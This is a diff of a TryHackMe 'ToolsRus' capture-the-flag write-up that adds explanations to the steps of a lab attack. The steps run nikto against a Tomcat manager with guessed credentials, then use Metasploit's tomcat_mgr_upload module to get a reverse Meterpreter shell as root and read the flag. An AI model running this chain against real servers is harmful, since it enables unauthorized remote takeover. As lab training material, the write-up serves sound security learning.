@@ -158,7 +158,7 @@ DOWNLOADED: 4612 - FOUND: 5
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Manager%20Logged%20In.png)
 
-13. `nikto -id {USER:PASSWORD} -host http://{TARGET IP}:1234/manager/html`
+13. `nikto -id {USER:PASSWORD} -host http://{TARGET IP}:1234/manager/html` to scan for potential web vulnerabilities on the target host while focusing at uncovering potential security weaknesses that could lead to unauthaurized disclosure of sensitive data using the provided ID credentials
 ```bash
 root@ip-10-10-171-134:~# nikto -id bob:bubbles -host http://10.10.199.35:1234/manager/html
 - Nikto v2.1.5
@@ -186,9 +186,9 @@ root@ip-10-10-171-134:~# nikto -id bob:bubbles -host http://10.10.199.35:1234/ma
 + 1 host(s) tested
 ```
 
-14. `msfconsole`
-15. `search Apache Tomcat`
-16. `info {EXPLOIT PATH}`
+14. `msfconsole` to launch the Metasploit Framework on our attack machine
+15. `search Apache Tomcat` to search for Apache Tomcat exploit modules, which revealed 32 exploit modules related to Apache Tomcat but the one we were really interested in was the **tomcat_mgr_upload** module
+16. `info {EXPLOIT PATH}` to output more detail about the **tomcat_mgr_upload** module onto our terminal 
 ```bash
 root@ip-10-10-171-134:~# msfconsole
                                                   
@@ -353,15 +353,15 @@ References:
 
 View the full module info with the info -d command.
 ```
-17. `use {EXPLOIT PATH}`
-18. `show options`
-19. `set HttpPassword {USER'S PASSWORD}`
-20. `set HttpUsername {USER'S USERNAME}`
-21. `set RHOSTS {TARGET IP}`
-22. `set RPORT 1234`
-23. `set TARGETURI /manager`
-24. `show options`
-25. `exploit`
+17. `use {EXPLOIT PATH}` to load the **tomcat_mgr_upload** for further configuration and execution
+18. `show options` to display the available and required options and their current values
+19. `set HttpPassword {USER'S PASSWORD}` to set the value of the **HttpPassword** variable to the user's password that we guessed using Hydra
+20. `set HttpUsername {USER'S USERNAME}` to set the value of the **HttpUsername** variable to the user's name that we found in the target's **/guidelines** page
+21. `set RHOSTS {TARGET IP}` to set the value of the **RHOSTS** variable to the target's IP address
+22. `set RPORT 1234` to set the value of the **RPORT** variable to the port number of the web server that's running the Tomcat manager page
+23. `set TARGETURI /manager` to set the value of the **TARGETURI** to the location of the target's Tomcat manager page
+24. `show options` to display the available options and their new current value to ensure that everything was properly set, which it was
+25. `exploit` to execute the module, which spawned in a reverse Meterpreter shell
 ```bash
 msf6 > use exploit/multi/http/tomcat_mgr_upload 
 [*] No payload configured, defaulting to java/meterpreter/reverse_tcp
@@ -484,9 +484,9 @@ msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
 
 meterpreter > 
 ```
-26. `getuid`
-27. `ls /root`
-28. `cat /root/{FLAG TEXT FILE}`
+26. `getuid` to retrieve the user ID of the currently compromised user on the target system that we're currently running as, which turned out to be root
+27. `ls /root` to display the available files and directories in the target's **/root** directory, which contained a text file called flag
+28. `cat /root/{FLAG TEXT FILE}` to display the contents of the text file we found onto our terminal, which ended up containing the flag for the final question in this challenge
 ```bash
 meterpreter > getuid
 Server username: root
